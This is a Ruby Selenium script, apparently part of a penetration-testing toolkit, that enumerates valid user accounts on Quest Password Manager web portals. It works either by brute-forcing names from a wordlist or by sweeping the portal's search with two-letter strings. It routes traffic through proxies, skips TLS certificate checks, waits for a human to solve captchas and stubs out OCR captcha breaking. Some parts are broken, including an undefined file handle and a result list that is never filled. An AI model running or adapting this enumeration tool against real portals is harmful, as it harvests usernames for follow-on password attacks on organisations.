begin
	require "selenium-webdriver"
rescue 
	puts "Selenium webdriver is not installed please install it: \"gem intall selenium-webdriver\""
end

require 'net/http'
require 'net/https'
require 'open-uri'
#require 'tesseract-ocr'

# Missing captchas implementation

class QPM
	def initialize(host,path,file,result_file,proxy,http_proxy)
		begin
			@base_url = host 	
			@path = path
			
			#puts "\n\nEnumerating users on #{@base_url}"
			
			if proxy == ""
				profile = Selenium::WebDriver::Firefox::Profile.new
				if http_proxy == ""
				  @driver = Selenium::WebDriver.for :firefox
				else
  				# Firefox profile configure HTTP(S) proxy
  				
  				proxy_info = http_proxy.split(":")
  				profile['network.proxy.http'] = proxy_info[0].to_s
  				profile['network.proxy.http_port'] = proxy_info[1].to_i
  				profile['network.proxy.ssl'] = proxy_info[0].to_s
  				profile['network.proxy.ssl_port'] = proxy_info[1].to_i
  				profile['network.proxy.type'] = 1
  				@driver = Selenium::WebDriver.for :firefox, :profile => profile
  			end
			else
				# Firefox profile configure socks proxy
				profile = Selenium::WebDriver::Firefox::Profile.new
				
				proxy_info = proxy.split(":")
				profile['network.proxy.socks'] = proxy_info[0].to_s
				profile['network.proxy.socks_port'] = proxy_info[1].to_i
				profile['network.proxy.type'] = 1

				@driver = Selenium::WebDriver.for :firefox, :profile => profile
			end
			
			@accept_next_alert = true
			@driver.manage.timeouts.implicit_wait = 30
			@verification_errors = []
			
			# Provide a file with a list of users 
			@file= file
			
			# Provide a result file where the users will be stored
			@result_file = result_file
			
			# Need these class variables to identify type of version of QPM since variables change
			@domain_select = ""
			@domain_list = ""
			@user_txt = ""
			@button = ""
			@captchas  = ""
			@home  = ""
			@dom = false
			qpm_version()
			
		rescue Exception => e  
  			puts e.message + "in intiliaze module QPM"
		end
	end
	
	def process_image( content )
		open("image.png", "wb") do |f|
			f.write(content)
		end
	end
	
	def check_search
		begin
			# Two versions of QPM. One will have a search option in a different URL the other one will allow you to search in the same URL
			puts "\nChecking if user search is enabled..."
			uri = URI.parse(@base_url+"/QPM/User/Identification/Search/")
			http = Net::HTTP.new(uri.host, uri.port)
			http.use_ssl = true
			http.verify_mode = OpenSSL::SSL::VERIFY_NONE
			request = Net::HTTP::Get.new(uri.request_uri)
			response = http.request(request)
			
			# Check if selecting a DOMAIN is required
			@dom = check_domain
			
			case response.code 
				when "404"
					@driver.get(@base_url + @path)
					if element_present?(:id, @user_txt)
						if check_captchas
						puts "	-----CAPCHAS are enabled. Please put Capchas manually using the browser and wait for the secript to continue"
						puts "	-----Don't worry you only have to do this once ;)"
						if @dom
							Selenium::WebDriver::Support::Select.new(@driver.find_element(:id, @domain_select)).select_by(:index, "1")
						end
						@driver.find_element(:id, @user_txt).clear
						@driver.find_element(:id, @user_txt).send_keys "a"
						sleep(30)
						if element_present?(:id,@button)
							@driver.find_element(:id, @button).click
						else
							@driver.find_element(:id, @search).click
						end
							if  element_present?(:class,"accountSearchResult")
								puts "	----- Search is enabled!"
								puts "	----- The provided users' file will not be used. Users will be extracted using the QPM search functionality"
								return true
							else
								puts "	----- Search is disabled :("
								return false
							end
						else
							puts "	----- No captchas. Great!"
						end
					end
					
				when "200"
					puts "	-----Search is enabled!"
					puts "	-----The provided users' file will not be used. Users will be extracted using the QPM search functionality"
					@path = "/QPM/User/Identification/Search/"
					return true
				when "302"
					# Just one redirect is handled
					puts "	----- Following redirect"
					location = response['location']
					warn "redirected to #{location}"
					if location.include?"/QPM/User/Identification/"
						return false
					else
						return redirect(location)
					end
				else
					puts "	----- check your host got reponse code: #{response.code}"
					return false
			end
		rescue Exception => e  
  			puts e.message + "==> check_search module QPM"
		end
	end
	
	def redirect(location)
		uri = URI.parse(location)
		http = Net::HTTP.new(uri.host, uri.port)
		http.use_ssl = true
		http.verify_mode = OpenSSL::SSL::VERIFY_NONE
		request = Net::HTTP::Get.new(uri.request_uri)
		response = http.request(request)
		
		if response.code == "200"
			return true
		else
			puts "Got response code: #{response.code}"
			return false
		end
	end
	
	def check_domain
		puts "	---- Checking if selecting a Domain is needed..."
		dom = false
		begin			
			if  element_present?(:id, @domain_list)
				@dom = true			
				select_domains = @driver.find_element(:id, @domain_list)
				domains = select_domains.find_elements(:tag_name, "option")
				
				puts "##########################################"
				domains.each do |domain|
					puts "	Domains found: " + domain.attribute("value")
				end
				puts "##########################################"
				puts "	\nBy default the first DOMAIN available is selected\n"
			else
				puts "	----- No Domain needed"
				@dom = false
			end
			return dom
		rescue Exception => e   
			puts "	No Domain needed"
			puts "Exception #{e}"
			return dom
		end
		return dom
	end
	
	# Function that uses QPM search capabilities to retrieve valid users accounts instead of bruteforcing them. Dependent on the functionality being enabled check_search
	def search_user
		begin
			# Open search web page
			@driver.get(@base_url + @path)
			
			
			# Check for Captchas and try to break them			
			if check_captchas
				puts "	-----CAPCHAS are enabled. Please put Capchas manually using the browser and wait for the script to continue"
				puts "	-----Don't worry you only have to do this once ;)"
				if @dom
					Selenium::WebDriver::Support::Select.new(@driver.find_element(:id, @domain_select)).select_by(:index, "1")
				end
				@driver.find_element(:id, @user_txt).clear
				@driver.find_element(:id, @user_txt).send_keys "whatever"
				sleep(20)
				@driver.find_element(:id, @button).click
				#get_captcha
				
			else
				puts "	----- No captchas. Great!"
			end	
			
			# Dumb search using 2 characters 
			start = 'aa'
			finish = 'zz'
			
			array_users = Array.new	
			
			while start!=finish
				# getting the driver every cycle is needed for sync problems even though programatically is not that efficient 
				@driver.get(@base_url + @path)
				if @dom
					Selenium::WebDriver::Support::Select.new(@driver.find_element(:id, @domain_select)).select_by(:index, "1")
				end
				
				if element_present?(:id, @user_txt)
					@driver.find_element(:id, @user_txt).clear
					@driver.find_element(:id, @user_txt).send_keys "#{start}"
					if element_present?(:id,@button)
						@driver.find_element(:id, @button).click
					else
						@driver.find_element(:id, @search).click
					end
				end
				
				
				@driver.manage.timeouts.implicit_wait = 10
				
				if  element_present?(:class,"accountSearchResult")
					results_f = File.new(@result_file.to_s,'a+') 
					results = @driver.find_element(:class,"accountSearchResult")
					users = results.find_elements(:tag_name,"a")					
					users.each do |user|
						usr = user.attribute("text").to_s.gsub(/\n+\s*/,"")			
						puts "Valid User Account #{usr}"
						results_f.puts usr
						
					end
					results_f.close
				elsif  element_present?(:class,"contentSearch")
					results_f = File.new(@result_file.to_s,'a+') 
					results = @driver.find_element(:class,"contentSearch")
					users = results.find_elements(:tag_name,"a")			
					users.each do |user|
						usr = user.attribute("text").to_s.gsub(/\n+\s*/,"")			
						puts "Valid User Account #{usr}"
						results_f.puts usr
						
					end
					results_f.close
				else
					puts "	No users were found while searching for string: #{start}"	
				end
				
				start = start.succ
				
			end
			
			# Remove duplicate and write in file
			array = array_users.uniq
			write_uniq(array)
			
			@driver.manage.delete_all_cookies
			@driver.quit
		
		rescue Exception => e  
  			puts e.message + "==> brute_user module QPM"
			@driver.quit
		end
	end
	
	def write_uniq(array_users)		
		file = File.new(@result_file,"w+")
		array_users.each do |user|
			file.puts user
		end
		file.close
	end
	
	def check_captchas
		# Check for Captchas
		puts "Checking for captchas..."
		if element_present?(:id, @captchas)
			return true
		else 			
			return false
		end
	end
	
	def qpm_version
		# Have to do this horrible patch because of the variables naming convention mess that this software has between different versions
		
		@driver.get(@base_url + @path)
		
		if element_present?(:id, "ctl00_ctl00_ctl00_ctl00_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ctl00_ButtonOk")					
			# I call this version 1 but who knows what version it is... who cares
			@user_txt = "ctl00_ctl00_ctl00_ctl00_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ctl00_TextBoxAccount"			
			@button = "ctl00_ctl00_ctl00_ctl00_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ctl00_ButtonOk"
			@domain_list = "ctl00_ctl00_ctl00_ctl00_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ctl00_ListBoxDomain"
			@domain_select = "ctl00_ctl00_ctl00_ctl00_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ctl00_ListBoxDomain"
			@captchas = "ctl00_ctl00_ctl00_ctl00_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ctl00_Captcha1_ImageCaptcha"
			@home = "ctl00_ctl00_ctl00_ctl00_ContentPlaceHolder_ContentPlaceHolder_SiteMenuControl_SiteMenuLink_home"
			
		elsif element_present?(:id, "ctl00_ctl00_ctl00_ctl00_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ButtonOk")
			# I call this version 2 but who knows what version it is... who cares
			@user_txt = "ctl00_ctl00_ctl00_ctl00_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_TextBoxAccount"			
			@button = "ctl00_ctl00_ctl00_ctl00_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ButtonOk"
			@domain_list = "ctl00_ctl00_ctl00_ctl00_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ListBoxDomain"
			@domain_select = "ctl00_ctl00_ctl00_ctl00_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ListBoxDomain"
			@captchas = "ctl00_ctl00_ctl00_ctl00_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_Captcha1_ImageCaptcha"
			@search = "ctl00_ctl00_ctl00_ctl00_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ContentPlaceHolder_ButtonOk_CenterPanel"
			@home = "ctl00_ctl00_ctl00_ctl00_ContentPlaceHolder_ContentPlaceHolder_SiteMenuControl_SiteMenuLink_home"
		elsif	 element_present?(:id, "button_Ok_control")
			# I call this version 3 but who knows what version it is... who cares
			@user_txt = "Account"
			@button = "button_Ok_control"
			@search = "button_Search_control"
			# haven't found one qpm witm captchas or domain on this version
		end
		@driver.manage.delete_all_cookies
	end
	
	def brute_user
		# Brute forcing user accounts based on file
		begin
			usr = File.new(@file.to_s,'r+')
			
			@driver.get(@base_url + @path)
			
			# Check for Captchas and try to break them			
			if check_captchas
				puts "	-----CAPCHAS are enabled. Please put Capchas manually using the browser and wait for the script to continue"
				puts "	-----Don't worry you only have to do this once ;)"
				if @dom
					Selenium::WebDriver::Support::Select.new(@driver.find_element(:id, @domain_select)).select_by(:index, "1")
				end
				@driver.find_element(:id, @user_txt).clear
				@driver.find_element(:id, @user_txt).send_keys "whatever"
				sleep(30)
				@driver.find_element(:id, @button).click
				#get_captcha
				
			else
				puts "	----- No captchas. Great!"
			end			
			
			
			
			results = File.new(@result_file.to_s,'w') 
			results.close
			
			usr.each do |user|
				@driver.get(@base_url + @path)
				
				user = user.delete("\n")
				
				results = File.new(@result_file.to_s,'a+') 
				
				if @dom
					Selenium::WebDriver::Support::Select.new(@driver.find_element(:id, @domain_select)).select_by(:index, "1")
				end
				puts "Testing User:#{user}"
				# Test user account
				if element_present?(:id, @user_txt)
					@driver.find_element(:id, @user_txt).clear
					@driver.find_element(:id, @user_txt).send_keys "#{user}"
					@driver.find_element(:id, @button).click
				end
				
				if element_present?(:id, @button) 
					puts "User Account #{user} NOT found"					
				else
					puts "Valid User Account #{user}"
					results.puts user				
					@driver.find_element(:id, @home).click
				end
				results.close
			end
			
			usr.close
			
			@driver.quit
			
		rescue Exception => e  
  			puts e.message + "==> brute_user module QPM"
			@driver.quit
		end			
	end
	
	def get_captcha
		puts "\n\nChecking if captchas are enabled..."
		image = @driver.find_element(:id, @captchas )
		captcha_url = image.attribute("src")
		
		#GET image using ruby 1.9.1 HTTPS library		
		#temp_file = File.open('c:\\temp\\image.jpg', 'w')
		uri = URI.parse(captcha_url)
		http = Net::HTTP.new(uri.host, uri.port)
		http.use_ssl = true
		http.verify_mode = OpenSSL::SSL::VERIFY_PEER
		#http.cookie = @driver.manage.all_cookies
		request = Net::HTTP::Get.new(uri.request_uri)
		response = http.request(request)		
		puts response.body
		puts response.code
		temp_file.close
	end
	
	def break_capcha
		e = Tesseract::Engine.new {|e|
			e.language  = :eng
			e.blacklist = '|'
		}
		puts e.text_for('image.jpg').strip # => 'ABC'
	end
	
	def read_file
		f = File.new(@file,'r+')
		f.each do |line|
			puts line
		end
		f.close
	end
	
	def element_present?(how, what)
		@driver.find_element(how, what)
		true
	rescue Selenium::WebDriver::Error::NoSuchElementError
		false
	end
  
	def verify(&blk)
		yield
	rescue ExpectationNotMetError => ex
		@verification_errors << ex
	end
  
	def close_alert_and_get_its_text(how, what)
		alert = @driver.switch_to().alert()
		if (@accept_next_alert) then
			alert.accept()
		else
			alert.dismiss()
		end
			alert.text
		ensure
			@accept_next_alert = true
	end
end

 